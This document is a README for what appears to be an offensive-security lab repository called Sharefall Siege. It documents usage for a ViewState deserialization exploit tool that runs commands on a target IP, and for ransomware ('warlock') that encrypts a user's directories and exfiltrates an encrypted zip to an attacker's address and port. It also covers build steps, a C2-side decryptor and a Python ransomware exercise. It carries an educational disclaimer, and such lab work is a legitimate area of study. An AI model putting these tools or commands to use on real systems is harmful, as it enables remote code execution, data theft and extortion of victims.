# **Sharefall Siege - Tier Cascade**
This repository contains source code, executables, and custom exploits developed for the Sharefall Siege Lab/Sharefall Siege Operation.

# ⚠️ **Disclaimer**  
All code in this repository is provided solely for educational and research purposes. Use is permitted only within isolated lab environments. Any application against production systems or unauthorized targets is strictly prohibited. The author assumes no responsibility for misuse or unlawful activity arising from this material.

# **Content and Usage**

# viewstate.exe

```powershell
./viewstate.exe -p <ysoserial.net pluginType> -g <generator> -va <validationKey> -alg <validationAlg> -c <command> -ip <targetIP>
```
### Parameters
- **`-p`** : Plugin type (e.g., ysoserial.net plugin)
- **`-g`** : Generator value
- **`-va`** : Validation key
- **`-alg`** : Validation algorithm
- **`-c`** : Command to execute remotely
- **`-ip`** : Target IP address

## warlock.exe

### Compiling:

- Generate a key-pair

- Save priv key in a file *priv_key.txt*, and paste pub key into a source code

- Compile with: go build -o *<output_name>* *<filename.go>*


```powershell
warlock.exe -m <mode> [options]
```
### Modes
- **encrypt** : Encrypt files in a target directory using AES  
- **decrypt-key** : Decrypt the AES key using your RSA private key  
- **decrypt-files** : Decrypt previously encrypted files using the restored AES key  

### Options
- **`-m`** : Operation mode (`encrypt`, `decrypt-key`, `decrypt-files`) *(required)*  
- **`-d`** : Path to the target directory *(required for encrypt and decrypt-files)*  
- **`-k`** : Path to RSA private key file *(required for decrypt-key)*  
- **`-i`** : IP address to send the encrypted zip file to  
- **`-p`** : Port number for exfiltration  
- **`-h`** : Show this help message  


### Examples
  ``` powershell
  warlock.exe -m encrypt -d "C:\Users\User1\Desktop" -i 192.168.1.10 -p 4444
  warlock.exe -m decrypt-key -k "C:\Users\User1\Desktop\priv_key.txt"
  warlock.exe -m decrypt-files -d "C:\Users\User1\Desktop"
  ```
  
Notes:  
  - warlock.exe and warlocklnx.exe are compiled with the keys uploaded to the repository. To use a new pair of keys, generate it, paste to priv_key.txt and to publicKeyPEM parameter, and compile a new executable

  - Option to exfiltrate files to the specified ip address 
  - Encrypted files will have the extension .x2anylock
  - AES key is saved to Desktop as YOUR_KEY.txt
  - System directories like `C:\Windows` and `C:\Program Files` are automatically skipped
  
# warlocklnx
Warlock - abridged version - compiled for linux; main purpose of it is to provide a way to decrypt files exfiltrated onto th C2 infrastructure of the attacker.

# do_you_even_ransom
Python code developed for the lab edition as an introductory exercise to demonstrate the basic mechanics of ransomware.  
This project is **educational in nature**, designed to provide a foundational understanding of how ransomware operates in controlled environments.  
The implementation was heavily inspired by the [ncorbuk/Python-Ransomware](https://github.com/ncorbuk/Python-Ransomware) tutorial.
